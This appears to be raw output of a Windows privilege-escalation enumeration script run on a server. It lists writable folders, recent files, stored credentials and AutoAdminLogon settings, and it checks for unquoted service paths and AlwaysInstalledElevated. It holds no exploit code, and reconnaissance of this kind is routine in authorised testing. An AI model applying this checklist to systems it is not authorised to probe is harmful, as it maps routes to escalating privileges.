KB4570333 9/9/2020 12:00:00 AM  



-----------------------------------------------------------
 Program Folders
-----------------------------------------------------------


C:\Program Files
-------------
Amazon                                     
Common Files                               
internet explorer                          
Windows Defender                           
Windows Defender Advanced Threat Protection
Windows Mail                               
Windows Media Player                       
Windows Multimedia Platform                
windows nt                                 
Windows Photo Viewer                       
Windows Portable Devices                   
Windows Security                           
WindowsPowerShell                          


C:\Program Files (x86)
-------------------
AWS SDK for .NET           
AWS Tools                  
Common Files               
Internet Explorer          
Microsoft.NET              
Windows Mail               
Windows Media Player       
Windows Multimedia Platform
windows nt                 
Windows Photo Viewer       
Windows Portable Devices   
WindowsPowerShell          



-----------------------------------------------------------
 Files with Full Control and Modify Access
-----------------------------------------------------------
-----------------------------------------------------------
 Folders with Full Control and Modify Access
-----------------------------------------------------------

C:\Users\Administrator                
C:\Users\Administrator\3D Objects     
C:\Users\Administrator\Contacts       
C:\Users\Administrator\Desktop        
C:\Users\Administrator\Documents      
C:\Users\Administrator\Downloads      
C:\Users\Administrator\Favorites      
C:\Users\Administrator\Links          
C:\Users\Administrator\Music          
C:\Users\Administrator\Pictures       
C:\Users\Administrator\Saved Games    
C:\Users\Administrator\Searches       
C:\Users\Administrator\Videos         
C:\Users\Administrator\Favorites\Links



C:\Windows\debug                                                                                     
C:\Windows\System32\config\systemprofile\AppData\Local\Packages\microsoft.windows.fontdrvhost\AC     
C:\Windows\System32\config\systemprofile\AppData\Local\Packages\microsoft.windows.fontdrvhost\AC\Temp



-----------------------------------------------------------
 Mapped Drives
-----------------------------------------------------------

C:                 


-----------------------------------------------------------
 Unquoted Service Paths
-----------------------------------------------------------

-----------------------------------------------------------
 Recent Documents
-----------------------------------------------------------

-----------------------------------------------------------
 Potentially Interesting Files in Users Directory 
-----------------------------------------------------------

-----------------------------------------------------------
 10 Last Modified Files in C:\User
-----------------------------------------------------------
C:\Users\Administrator\Downloads
C:\Users\Administrator
C:\Users\Administrator\Music
C:\Users\Administrator\Documents
C:\Users\Administrator\Saved Games
C:\Users\Administrator\Searches
C:\Users\Administrator\Links\Desktop.lnk
C:\Users\Administrator\Links\Downloads.lnk
C:\Users\Administrator\Links
C:\Users\Administrator\Desktop

-----------------------------------------------------------
 MUICache Files
-----------------------------------------------------------


-----------------------------------------------------------
 System Files with Passwords
-----------------------------------------------------------

-----------------------------------------------------------
 AlwaysInstalledElevated Registry Key
-----------------------------------------------------------

-----------------------------------------------------------
 Stored Credentials
-----------------------------------------------------------

Currently stored credentials:

* NONE *

-----------------------------------------------------------
 Checking for AutoAdminLogon 
-----------------------------------------------------------
The default username is Administrator 
The default password is  
The default domainname is SERVER 

```